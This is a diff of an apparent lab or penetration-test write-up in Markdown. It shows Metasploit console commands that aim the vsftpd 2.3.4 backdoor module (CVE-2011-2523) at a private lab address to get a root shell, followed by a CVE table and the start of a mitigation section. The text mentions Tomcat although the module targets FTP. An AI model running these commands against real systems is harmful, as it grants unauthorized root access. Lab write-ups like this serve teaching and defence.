@@ -202,15 +202,21 @@ However, in this specific case, we will focus on exploiting port:
 
 ![[Pasted image 20250512145644.png]]
 
-# Find a functional exploit 
+# Find a functional exploit
+
 We launched Metasploit and searched for exploits related to this version of Tomcat.
 
-We properly configured the exploit:
+We properly configured the exploit
+
 ```python
 > msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+```
 
+```python
 > msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.16.25.2
+```
 
+```python
 > msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 ```
 
@@ -224,9 +230,9 @@ This exploit run a Backdoor Command Execution and provides us with a root shell
 | -------------- | -------------------------- | ------------- | ------------------------------------------------------------------------- |
 | CVE-2011-2523  | Backdoor Command Execution | ==10.0/HIGH== | [[[NVD - CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)]] |
 |                |                            |               |                                                                           |
-|                |                            |               |                                                                           |
 
 # mitigation
+
 For CVE-2011-2523, the mitigation involves the following steps:
 
 ```python
